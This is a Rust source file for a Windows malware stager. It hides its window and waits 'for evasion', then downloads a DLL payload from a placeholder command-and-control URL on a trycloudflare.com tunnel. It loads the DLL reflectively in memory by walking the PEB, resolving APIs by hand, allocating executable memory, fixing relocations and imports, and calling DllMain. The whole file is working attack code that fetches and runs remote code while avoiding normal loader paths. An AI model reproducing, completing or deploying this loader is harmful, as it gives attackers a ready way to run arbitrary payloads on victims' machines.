// Minimal stager - downloads DLL and reflective loads it
// Size target: <500KB
#![windows_subsystem = "windows"]

use std::ptr;
use std::time::Duration;

const C2_URL: &str = "https://CHANGE-MECHANGE-ME.trycloudflare.com";
const TOKEN: &str = "00000000000000000000000000000000";

#[cfg(windows)]
fn main() {
    // Small delay for evasion
    std::thread::sleep(Duration::from_millis(500));
    
    // Download DLL
    let url = format!("{}/payloads/agent.dll?key={}", C2_URL, TOKEN);
    let dll_bytes = match ureq::get(&url)
        .timeout(Duration::from_secs(30))
        .call()
    {
        Ok(resp) => {
            let mut buf = Vec::new();
            resp.into_reader().read_to_end(&mut buf).ok();
            buf
        }
        Err(_) => return,
    };
    
    if dll_bytes.len() < 1000 { return; }
    
    // Reflective load
    unsafe { reflective_load(&dll_bytes); }
}

#[cfg(windows)]
unsafe fn reflective_load(dll: &[u8]) {
    use std::mem;
    
    type FnVirtualAlloc = unsafe extern "system" fn(*const u8, usize, u32, u32) -> *mut u8;
    type FnGetProcAddress = unsafe extern "system" fn(*mut u8, *const i8) -> *mut u8;
    type FnLoadLibraryA = unsafe extern "system" fn(*const i8) -> *mut u8;
    type FnDllMain = unsafe extern "system" fn(*mut u8, u32, *mut u8) -> i32;
    
    let kernel32 = get_module(b"kernel32.dll\0");
    if kernel32.is_null() { return; }
    
    let virtual_alloc: FnVirtualAlloc = mem::transmute(get_proc(kernel32, b"VirtualAlloc\0"));
    let get_proc_address: FnGetProcAddress = mem::transmute(get_proc(kernel32, b"GetProcAddress\0"));
    let load_library: FnLoadLibraryA = mem::transmute(get_proc(kernel32, b"LoadLibraryA\0"));
    
    // Parse PE
    let dos_header = dll.as_ptr() as *const u16;
    if *dos_header != 0x5A4D { return; } // MZ
    
    let e_lfanew = *(dll.as_ptr().add(0x3C) as *const u32) as usize;
    let nt_headers = dll.as_ptr().add(e_lfanew);
    
    if *(nt_headers as *const u32) != 0x4550 { return; } // PE
    
    let size_of_image = *(nt_headers.add(0x50) as *const u32) as usize;
    let size_of_headers = *(nt_headers.add(0x54) as *const u32) as usize;
    let entry_point = *(nt_headers.add(0x28) as *const u32) as usize;
    let num_sections = *(nt_headers.add(0x6) as *const u16) as usize;
    let opt_header_size = *(nt_headers.add(0x14) as *const u16) as usize;
    
    // Allocate
    let base = virtual_alloc(ptr::null(), size_of_image, 0x3000, 0x40);
    if base.is_null() { return; }
    
    // Copy headers
    ptr::copy_nonoverlapping(dll.as_ptr(), base, size_of_headers);
    
    // Copy sections
    let sec_header = nt_headers.add(0x18 + opt_header_size);
    for i in 0..num_sections {
        let sec = sec_header.add(i * 40);
        let virtual_addr = *(sec.add(12) as *const u32) as usize;
        let size_raw = *(sec.add(16) as *const u32) as usize;
        let ptr_raw = *(sec.add(20) as *const u32) as usize;
        
        if size_raw > 0 && ptr_raw < dll.len() {
            ptr::copy_nonoverlapping(dll.as_ptr().add(ptr_raw), base.add(virtual_addr), size_raw);
        }
    }
    
    // Process relocations
    let reloc_rva = *(nt_headers.add(0xB0) as *const u32) as usize;
    let reloc_size = *(nt_headers.add(0xB4) as *const u32) as usize;
    let image_base = *(nt_headers.add(0x30) as *const u64);
    let delta = base as i64 - image_base as i64;
    
    if reloc_rva > 0 && delta != 0 {
        let mut offset = 0usize;
        while offset < reloc_size {
            let block = base.add(reloc_rva + offset);
            let page_rva = *(block as *const u32) as usize;
            let block_size = *(block.add(4) as *const u32) as usize;
            
            if block_size == 0 { break; }
            
            let entries = (block_size - 8) / 2;
            for j in 0..entries {
                let entry = *(block.add(8 + j * 2) as *const u16);
                let typ = (entry >> 12) & 0xF;
                let off = (entry & 0xFFF) as usize;
                
                if typ == 10 { // IMAGE_REL_BASED_DIR64
                    let addr = base.add(page_rva + off) as *mut i64;
                    *addr += delta;
                }
            }
            offset += block_size;
        }
    }
    
    // Process imports
    let import_rva = *(nt_headers.add(0x90) as *const u32) as usize;
    if import_rva > 0 {
        let mut import_desc = base.add(import_rva);
        loop {
            let name_rva = *(import_desc.add(12) as *const u32) as usize;
            if name_rva == 0 { break; }
            
            let dll_name = base.add(name_rva) as *const i8;
            let module = load_library(dll_name);
            if module.is_null() { 
                import_desc = import_desc.add(20);
                continue; 
            }
            
            let mut thunk_rva = *(import_desc as *const u32) as usize;
            if thunk_rva == 0 {
                thunk_rva = *(import_desc.add(16) as *const u32) as usize;
            }
            let mut iat_rva = *(import_desc.add(16) as *const u32) as usize;
            
            loop {
                let thunk = *(base.add(thunk_rva) as *const u64);
                if thunk == 0 { break; }
                
                let func = if thunk & 0x8000000000000000 != 0 {
                    // Ordinal
                    get_proc_address(module, (thunk & 0xFFFF) as *const i8)
                } else {
                    // Name
                    let hint_name = base.add(thunk as usize + 2);
                    get_proc_address(module, hint_name as *const i8)
                };
                
                *(base.add(iat_rva) as *mut u64) = func as u64;
                
                thunk_rva += 8;
                iat_rva += 8;
            }
            
            import_desc = import_desc.add(20);
        }
    }
    
    // Call DllMain
    let dll_main: FnDllMain = mem::transmute(base.add(entry_point));
    dll_main(base, 1, ptr::null_mut()); // DLL_PROCESS_ATTACH
}

#[cfg(windows)]
unsafe fn get_module(name: &[u8]) -> *mut u8 {
    type FnGetModuleHandleA = unsafe extern "system" fn(*const i8) -> *mut u8;
    let kernel32 = get_kernel32();
    let get_module: FnGetModuleHandleA = std::mem::transmute(get_proc(kernel32, b"GetModuleHandleA\0"));
    get_module(name.as_ptr() as *const i8)
}

#[cfg(windows)]
unsafe fn get_kernel32() -> *mut u8 {
    // Get kernel32 from PEB
    let peb: *mut u8;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    let ldr = *(peb.add(0x18) as *mut *mut u8);
    let list = ldr.add(0x20) as *mut *mut u8;
    let mut entry = *list;
    
    loop {
        let dll_base = *(entry.add(0x20) as *mut *mut u8);
        if !dll_base.is_null() {
            let name_ptr = *(entry.add(0x50) as *mut *mut u16);
            let name_len = *(entry.add(0x48) as *mut u16) as usize / 2;
            
            if name_len >= 12 {
                // Check for kernel32.dll (case insensitive)
                let c0 = *name_ptr as u8;
                let c1 = *name_ptr.add(1) as u8;
                if (c0 == b'k' || c0 == b'K') && (c1 == b'e' || c1 == b'E') {
                    return dll_base;
                }
            }
        }
        entry = *(entry as *mut *mut u8);
        if entry == *list { break; }
    }
    ptr::null_mut()
}

#[cfg(windows)]
unsafe fn get_proc(module: *mut u8, name: &[u8]) -> *mut u8 {
    let dos = module as *const u16;
    if *dos != 0x5A4D { return ptr::null_mut(); }
    
    let e_lfanew = *(module.add(0x3C) as *const u32) as usize;
    let export_rva = *(module.add(e_lfanew + 0x88) as *const u32) as usize;
    if export_rva == 0 { return ptr::null_mut(); }
    
    let export_dir = module.add(export_rva);
    let num_names = *(export_dir.add(0x18) as *const u32) as usize;
    let addr_table = module.add(*(export_dir.add(0x1C) as *const u32) as usize);
    let name_table = module.add(*(export_dir.add(0x20) as *const u32) as usize);
    let ord_table = module.add(*(export_dir.add(0x24) as *const u32) as usize);
    
    for i in 0..num_names {
        let name_rva = *(name_table.add(i * 4) as *const u32) as usize;
        let func_name = module.add(name_rva);
        
        // Compare names
        let mut match_found = true;
        for (j, &c) in name.iter().enumerate() {
            if c == 0 { break; }
            if *func_name.add(j) != c {
                match_found = false;
                break;
            }
        }
        
        if match_found {
            let ordinal = *(ord_table.add(i * 2) as *const u16) as usize;
            let func_rva = *(addr_table.add(ordinal * 4) as *const u32) as usize;
            return module.add(func_rva);
        }
    }
    ptr::null_mut()
}

#[cfg(not(windows))]
fn main() {
    println!("Windows only");
}
